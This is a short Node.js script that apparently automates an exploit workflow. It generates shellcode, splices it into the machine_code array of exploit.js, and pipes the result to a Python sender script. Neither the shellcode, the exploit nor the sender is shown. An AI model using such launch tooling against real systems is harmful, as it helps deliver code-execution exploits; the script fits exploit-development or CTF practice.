#!/usr/bin/node

const { exec } = require("child_process");
const fs = require("fs");

exec("node ./shellcode.js", function (a, shellcode) {
  console.log("shellcode:");
  console.log(shellcode);
  shellcode = shellcode.replace("\n", "");
  var exploit = fs.readFileSync(__dirname + "/exploit.js").toString();
  const line = exploit.substring(
    exploit.lastIndexOf("var machine_code ="),
    exploit
      .substr(exploit.lastIndexOf("var machine_code =") + 1)
      .indexOf("\n") +
      exploit.lastIndexOf("var machine_code =") +
      1
  );
  exploit = exploit.replace(line, "var machine_code = [ " + shellcode + " ];");
  fs.writeFileSync(__dirname + "/exploit.js", exploit);
  exec("cat ./exploit.js | python2 ./send.py", function (a, output) {
    console.log("output:");
    console.log(output);
  });
});
